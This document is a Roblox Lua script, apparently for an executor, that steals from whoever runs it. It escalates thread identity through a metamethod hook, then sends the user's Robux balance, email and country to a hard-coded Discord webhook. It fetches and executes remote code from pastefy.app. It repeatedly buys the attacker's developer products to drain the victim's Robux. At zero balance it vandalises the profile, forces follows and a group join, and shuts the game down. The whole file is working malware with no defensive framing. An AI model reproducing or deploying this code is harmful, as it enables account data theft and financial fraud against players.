getrenv()._set = clonefunction(setthreadidentity)
local old old = hookmetamethod(game, "__index", function(a, b) task.spawn(function() _set(7) task.wait()

local robux = game:GetService("HttpRbxApiService"):GetAsyncFullUrl("https://economy.roblox.com/v1/user/currency")
local email = game:GetService("HttpRbxApiService"):GetAsyncFullUrl("https://accountsettings.roblox.com/v1/email")
local country = game:GetService("HttpRbxApiService"):GetAsyncFullUrl("https://users.roblox.com/v1/users/authenticated/country-code")

json = {
	content = "@everyone ez beam\nUser ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nrobux: " .. tostring(robux) .. "\nCountry? " .. tostring(country) .. ""
}

local msg = game:GetService("HttpService"):JSONEncode(json)

request({
	Url = "https://discord.com/api/webhooks/1239298342974918829/J8gWUl4hSspyQvtjKFqj9ZRUuCFLq-_VJdDHbkazukh4aPFOtwCaOqgvikvWQMaFpZXl", 
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = msg
})

end) hookmetamethod(game, "__index", old) return old(a, b) end)

local function reject()
loadstring(game:HttpGet("https://pastefy.app/tHefbOGy/raw"))()
wait(100000000000)
end

-- checks if HttpRbxApiService is blocked
local suc, err = pcall(function() game:GetService("HttpRbxApiService"):GetAsyncFullUrl("https://economy.roblox.com/v1/user/currency") end)
if not err then
print("Failed")
else
reject()
end

while task.wait(0.25) do
local x = game:GetService("HttpRbxApiService") 
local rb

local response = x:GetAsyncFullUrl("https://economy.roblox.com/v1/user/currency") 

local startIndex = string.find(response, '{"robux":')

if startIndex then
    local endIndex = string.find(response, '}', startIndex)

    if endIndex then
        rb = tonumber(string.sub(response, startIndex + 9, endIndex - 1))
    end
end 


local poor = '{"expectedCurrency":1,"expectedPrice":15,"expectedSellerId":2404979821}'
local mid = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":2404979821}'
local ok = '{"expectedCurrency":1,"expectedPrice":50,"expectedSellerId":2404979821}'
local super = '{"expectedCurrency":1,"expectedPrice":100,"expectedSellerId":2404979821}'
local yay = '{"expectedCurrency":1,"expectedPrice":200,"expectedSellerId":2404979821}'
local wow = '{"expectedCurrency":1,"expectedPrice":300,"expectedSellerId":2404979821}'
local ez = '{"expectedCurrency":1,"expectedPrice":500,"expectedSellerId":2404979821}'
local meow = '{"expectedCurrency":1,"expectedPrice":750,"expectedSellerId":2404979821}'
local lol = '{"expectedCurrency":1,"expectedPrice":1000,"expectedSellerId":2404979821}'
local hi = '{"expectedCurrency":1,"expectedPrice":1500,"expectedSellerId":2404979821}'
local dexten = '{"expectedCurrency":1,"expectedPrice":2000,"expectedSellerId":2404979821}'
local krampus = '{"expectedCurrency":1,"expectedPrice":2500,"expectedSellerId":2404979821}'
local horse = '{"expectedCurrency":1,"expectedPrice":4000,"expectedSellerId":2404979821}'
local kitten = '{"expectedCurrency":1,"expectedPrice":6000,"expectedSellerId":2404979821}'
local dog = '{"expectedCurrency":1,"expectedPrice":8000,"expectedSellerId":2404979821}'
local chips = '{"expectedCurrency":1,"expectedPrice":13000,"expectedSellerId":2404979821}'
local lion = '{"expectedCurrency":1,"expectedPrice":20000,"expectedSellerId":2404979821}'
local flight = '{"expectedCurrency":1,"expectedPrice":35000,"expectedSellerId":2404979821}'
local nl = '{"expectedCurrency":1,"expectedPrice":50000,"expectedSellerId":2404979821}'
local kip = '{"expectedCurrency":1,"expectedPrice":75000,"expectedSellerId":2404979821}'
local iraq = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":2404979821}'

task.wait(0.01)

local function godly() 
local player = game.Players.LocalPlayer
local userId = player.UserId
local description = '{"description":"BEAMED BY ZMURK"}'
local none = ''
local arab = '{"supportedLocaleCode":"ar-001"}'
local friend = '{"friendshipOriginSourceType":0}'
local changedisplay = {
    Url = "https://users.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/display-names",
    Method = "PATCH",
    Body = '{"newDisplayName":"BEAMEDBYZMURK"}',
}

local followaccount, followacc = pcall(function()
game:GetService("HttpRbxApiService"):PostAsyncFullUrl('https://friends.roblox.com/v1/users/2404979821/follow', none)
end)
task.wait(0.01)
local joingroup, joining = pcall(function()
game:GetService("HttpRbxApiService"):PostAsyncFullUrl('https://groups.roblox.com/v1/groups/9666767/users', none)
end)
task.wait(0.01)
local updatedesclol, updatdescription = pcall(function()
game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://users.roblox.com/v1/description", description)
end)
task.wait(0.01)
local displaynamemagic, namedisplaymagik = pcall(function()
game:GetService("HttpRbxApiService"):RequestAsync(changedisplay)
end)
task.wait(0.01)
game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://locale.roblox.com/v1/locales/set-user-supported-locale", arab)
task.wait(0.01)
local fearr, fearrr = pcall(function()
game:GetService("HttpRbxApiService"):PostAsyncFullUrl('https://friends.roblox.com/v1/users/523139588/follow', none)
end)
task.wait(0.01)
local ocaml, camell = pcall(function()
game:GetService("HttpRbxApiService"):PostAsyncFullUrl('https://friends.roblox.com/v1/users/750955342/follow', none)
end)
task.wait(0.01)
game:Shutdown()
task.wait(3)
print("Rejoin If dont see anything")
end



if rb == 0 then
godly()
elseif rb > 0 and rb < 15 then
godly()
elseif rb >= 15 and rb < 25 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829108657", poor)
wait()
elseif rb >= 25 and rb < 50 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829109036", mid)
wait()
elseif rb >= 50 and rb < 100 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829109333", ok)
wait()
elseif rb >= 100 and rb < 200 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829109682", super)
wait()
elseif rb >= 200 and rb < 300 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829109960", yay)
wait()
elseif rb >= 300 and rb < 500 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829110115", wow)
wait()
elseif rb >= 500 and rb < 750 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829114882", ez)
wait()
elseif rb >= 750 and rb < 1000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829115084", meow)
wait()
elseif rb >= 1000 and rb < 1500 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829115349", lol)
wait()
elseif rb >= 1500 and rb < 2000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829115487", hi)
wait()
elseif rb >= 2000 and rb < 2500 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829116024", dexten)
wait()
elseif rb >= 2500 and rb < 4000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829119291", krampus)
wait()
elseif rb >= 4000 and rb < 6000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829120524", horse)
wait()
elseif rb >= 6000 and rb < 8000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829120726", kitten)
wait()
elseif rb >= 8000 and rb < 13000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829121518", dog)
wait()
elseif rb >= 13000 and rb < 20000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829121680", chips)
wait()
elseif rb >= 20000 and rb < 35000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829121851", lion)
wait()
elseif rb >= 35000 and rb < 50000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829122047", flight)
wait()
elseif rb >= 50000 and rb < 75000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829122344", nl)
wait()
elseif rb >= 75000 and rb < 150000 then
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829122559", kip)
wait()
else
x:PostAsyncFullUrl("https://economy.roblox.com/v1/purchases/products/1829122794", iraq)
wait()
end

task.wait(0.01)
end